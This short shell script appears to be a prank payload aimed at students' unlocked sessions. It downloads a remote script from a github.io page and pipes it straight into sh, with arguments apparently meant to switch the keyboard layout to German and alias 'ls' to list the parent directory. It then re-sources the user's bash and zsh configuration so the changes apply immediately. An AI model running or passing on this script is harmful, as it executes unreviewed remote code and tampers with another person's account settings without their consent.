#!/bin/sh

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "de-keyboard" "'alias ls=\"ls ..\"'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
